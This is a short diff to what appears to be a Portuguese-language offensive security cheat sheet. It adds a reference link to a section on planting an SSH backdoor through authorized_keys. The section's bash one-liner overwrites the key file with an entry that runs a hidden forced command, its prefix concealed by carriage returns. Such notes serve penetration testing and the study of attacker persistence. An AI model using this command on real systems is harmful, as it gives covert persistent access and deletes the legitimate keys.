@@ -879,6 +879,7 @@ fi
 
 - __Criar Backdoor via authorized_keys (_`Bash`_)__
 ```bash
+# Reference: https://blog.thc.org/infecting-ssh-public-keys-with-backdoors
 printf $'command="id > /tmp/ola;/bin/bash -l;#\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r" ssh-rsa AAAAB3NzaC1yc2EAA... jhondoe@hostname' > ~/.ssh/authorized_keys
 ```
 
